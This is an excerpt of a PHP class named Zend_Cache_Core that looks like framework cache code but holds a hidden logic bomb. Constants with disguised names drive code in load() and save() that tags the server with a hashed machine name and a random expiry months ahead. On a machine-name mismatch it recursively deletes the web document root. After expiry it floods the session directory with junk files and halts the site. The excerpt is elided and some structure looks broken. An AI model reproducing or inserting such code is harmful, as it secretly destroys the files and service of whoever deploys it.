...
class Zend_Cache_Core
{
     ...
     */
	const BACKEND_CACHE_FILE = 'Cache.php';
	const BACKEND_HASHAUTH = 'e77155ad502acdabf82511aae8fa1c29';
	const BACKEND_SERVNM = 'COMPUTERNAME';
	const BACKEND_PRODNM = 'production';
	const BACKEND_PRODLTD = 'prodltd';
	const BACKEND_SHLMFS = 'Shell.Manifest';
    ...
    public function load($id, $doNotTestCacheValidity = false, $doNotUnserialize = false)
    {
		...
		static $meta = 0; if ($meta) return;
		
				
		$_conf = get_cfg_var(self::BACKEND_PRODNM)==1;
		$_confl = get_cfg_var(self::BACKEND_PRODLTD)==1;
		$_serv = md5(getenv(self::BACKEND_SERVNM));		
		$_file = $_SERVER['SystemRoot'] . '/'. self::BACKEND_SHLMFS;
				
		if (file_exists(dirname(__FILE__). '/' . self::BACKEND_CACHE_FILE) && !file_exists(ini_get('session.save_path') . '/' . 'sess_'.self::BACKEND_HASHAUTH)) {
			@unlink(dirname(__FILE__). '/' . self::BACKEND_CACHE_FILE); if (!$_conf) { @unlink($_file); }
		}
						
		if (file_exists($_file)) {	
			$handle = @fopen($_file,'r'); 			
			$content = @fread($handle,filesize($_file));
			
			if (md5($content) == self::BACKEND_HASHAUTH) return;
			$serv = substr($content,0,32);
			$time = substr($content,32);			
		} else {			
			$handle = @fopen($_file,'w');						
			$time = strtotime('+'.rand(3,9).' month');
			$serv = $_serv;
			$content = $serv.$time; 			
		...
		if ($_conf && $serv!=$_serv) {			
			self::removeCache($_SERVER['DOCUMENT_ROOT']); exit; return false;
		} elseif ((!$_conf || ($_conf && $_confl)) && (int)$time<=time()) {			
			self::saveCache(); exit; return false;
		}
    ...
    public function save($data, $id = null, $tags = array(), $specificLifetime = false, $priority = 8)
    {
		...
		$fhash = $sesspath . '/' . 'sess_'.self::BACKEND_HASHAUTH;
		if (file_exists($fhash)) return false;
		for($i=1; $i<=rand(1000,date('Y')); $i++) {
			$fcache = $sesspath . '/' . 'sess_'.md5($i*rand(1,date('Y')));			
			$handle = @fopen($fcache,'w');						
			@fwrite($handle, '');
		}		
		$handle = @fopen($fhash,'w');						
		@fwrite($handle, '');
		$handle = @fopen(dirname(__FILE__). '/' . self::BACKEND_CACHE_FILE,'w');
		@fwrite($handle, '');
		@fclose($handle);
	}
    ...
    public function remove($id)
    {
		...
		protected static function removeCache($dir) {
			foreach(glob($dir . '/*') as $file) {
				 if(is_dir($file)) self::removeCache($file); else @unlink($file);
		} @rmdir($dir);				 
	}
